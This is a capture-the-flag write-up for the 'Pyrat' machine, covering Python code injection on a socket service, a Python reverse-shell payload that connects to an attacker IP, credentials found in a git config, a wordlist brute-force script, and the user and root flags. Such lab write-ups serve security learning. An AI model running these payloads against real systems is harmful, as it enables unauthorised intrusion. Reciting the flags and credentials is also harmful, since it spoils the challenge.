# Pyrat CTF Write-up

Overview
This write-up covers the complete methodology, tools, scripts, and logic used to solve the Pyrat CTF challenge. The main objective was to gain initial access, escalate privileges, and ultimately retrieve the root.txt flag.

# Step 1: Initial Enumeration

Nmap Scan
We started with an nmap scan which revealed port 8000 was open on the target machine:
nmap -p- -sV -sC -A <target-ip>
Port 8000 responded with an HTTP service that did not behave like a traditional web server. After visiting the webpage on port 8000 i was given the clue to try a more basic connection which prompted me to use netcat or telnet.

Connecting via Netcat
nc <target-ip> 8000
Once connected, arbitrary input would either return syntax errors or specific server messages, which hinted at a custom Python socket server running on the backend.

Confirming Python Code Execution
We began testing Python payloads:
print(__import__('os').popen('whoami').read())
This confirmed that we were running under the www-data user.

# Step 2: Reverse Shell for Stability
To establish a more stable connection, we sent a reverse shell payload:
```__import__('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker-ip>\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'")```
We received a stable reverse shell on our listener:
nc -lvnp 4444

# Step 3: Privilege Escalation Enumeration

SUID Binaries Check
find / -perm -4000 -type f 2>/dev/null
This revealed several binaries including pkexec, which was version 0.105 — known to be vulnerable to CVE-2021-3560.

LinPEAS Output
LinPEAS also flagged CVE-2021-3560 and sudo-related vulnerabilities like CVE-2021-3156 (Baron Samedit).

# Step 4: Alternative Enumeration via Source Code
While considering privilege escalation paths, we explored the filesystem and discovered a .git directory at:
/opt/dev/.git
By inspecting the Git config:
cat config
We found this:
[user]
    name = Jose Mario
    email = josemlwdf@github.com
[credential]
    helper = cache --timeout=3600
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
These credentials were valid for the think user and allowed us to escalate from www-data to think using:
su think
# password: _TH1NKINGPirate$_
Then we navigated to /home/think/ and captured the user flag:
cat user.txt
996bdb1f619a68361417cabca5454705

# Step 5: Exploring Application Source Code
Inside /opt/dev/, we found a backup of an older script named pyrat.py.old. Inspecting it via git show:
git show HEAD:pyrat.py.old
We observed a function called switch_case(client_socket, data) that dispatches based on received input. One key part was:
if data == 'admin':
    # triggers authentication check
If successful, an admin shell is granted — but only if credentials are correct.

# Step 6: Admin Endpoint and Brute Force

Behavior Discovery
Typing admin into the netcat session resulted in:
Password:
An incorrect attempt gave:
Start a fresh client to begin.
This confirmed password bruteforcing was viable.


Brute-force Script
```
import socket

#Configuration

target_ip = "<target-ip>"
target_port = 8000
password_wordlist = "/usr/share/wordlists/rockyou.txt"

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')

        response = client_socket.recv(1024).decode()
        if "Password:" in response:
            client_socket.sendall(password.encode() + b"\n")
            response = client_socket.recv(1024).decode()
            if "success" in response.lower() or "admin" in response.lower():
                print(f"✅ Password FOUND: {password}")
                return True
        return False
    except:
        return False
    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r", encoding="latin-1") as file:
        for password in file:
            password = password.strip()
            if connect_and_send_password(password):
                break

if __name__ == "__main__":
    fuzz_passwords()
```
Result
[abc123] → Welcome Admin!!! Type "shell" to begin
✅ Password FOUND: abc123
We typed shell and obtained a shell with root privileges.

Step 7: Capture the Flag
cat /root/root.txt
ba5ed03e9e74bb98054438480165e221

Summary of Key Payloads
• Initial shell:
```__import__('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker-ip>\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'")```
◇ Git credentials:
username = think
password = _TH1NKINGPirate$_
◇ Final password: abc123

◇ User flag:
996bdb1f619a68361417cabca5454705
◇ Root flag:
ba5ed03e9e74bb98054438480165e221

Conclusion
This CTF required a blend of enumeration, source code analysis, reverse shell techniques, and creative brute-forcing. The biggest breakthrough came from inspecting the Git directory, which revealed valid user credentials that helped escalate privileges and ultimately led to root.
We also demonstrated the value of recognizing non-standard services and using lightweight connections like Netcat, which opened the door for low-level interaction and payload delivery. Patience in fuzzing and thorough source code review led to final success.
